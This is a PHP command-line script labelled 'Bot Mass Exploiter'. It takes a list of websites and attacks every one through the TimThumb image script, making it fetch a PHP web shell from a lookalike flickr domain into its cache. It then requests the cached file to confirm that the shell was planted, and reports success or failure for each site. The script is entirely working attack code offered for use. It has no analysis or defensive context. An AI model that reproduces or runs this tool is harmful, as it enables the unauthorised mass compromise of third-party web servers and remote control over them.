<?php
/*
	Created By N4ST4R_ID
	Klu Tulisan Sukses Tapi Not Found
	Coba Delete "external_"
	Visit my stupid blog www.NyamuXpl0it.xyz
*/
system("clear");
$hij = "\033[0;32m";
$mer = "\033[0;31m";
$put = "\033[1;37m";
$gtw = "\033[2;33m";
echo $put."
 _______ _____ __  __ _______ _    _ _    _ __  __ ____  
|__   __|_   _|  \/  |__   __| |  | | |  | |  \/  |  _ \ 
   | |    | | | \  / |  | |  | |__| | |  | | \  / | |_) |	Bot Mass
   | |    | | | |\/| |  | |  |  __  | |  | | |\/| |  _ < 
   | |   _| |_| |  | |  | |  | |  | | |__| | |  | | |_) |	Exploiter
   |_|  |_____|_|  |_|  |_|  |_|  |_|\____/|_|  |_|____/ 
/!\ Code By N4ST4R_ID /!\ D704T /!\ www.NyamuXpl0it.xyz /!\
\n\n";
if (!$argv[1]) {
	echo $mer."Usage: php ".$argv[0]." LIST \n";
} else {
	$url = $argv[1];
	$ngambil = file_get_contents($url);
	$ledak = explode("\n", $ngambil);
	$try = count($ledak);
	sleep(2);
	echo $gtw."Jumlah list [ ".$try." ] sites \n";
	sleep(1);
	echo $gtw."Wait... \n\n";
	foreach($ledak as $duar) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $duar."/timthumb.php?src=http://flickr.com.tvcw.org/shell.php");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		$x = curl_exec($ch);
		curl_close($ch);
		//cek
	sleep(2);
	$upna = "http://flickr.com.tvcw.org/shell.php";
	$hes = md5($upna);
	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, $duar."/cache/external_".$hes.".php");
	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
	$e = curl_exec($c);
	$info = curl_getinfo($c, CURLINFO_HTTP_CODE);
	curl_close($c);
		if (preg_match("/N4ST4R_ID/", $info) or $info == "200") {
			echo $hij."[+] [SUKSES] > ".$duar."/cache/external_".$hes.".php \n";
		} else {
			echo $mer."[-] [GAGAL] > ".$duar."\n";
		}
	}
}
?>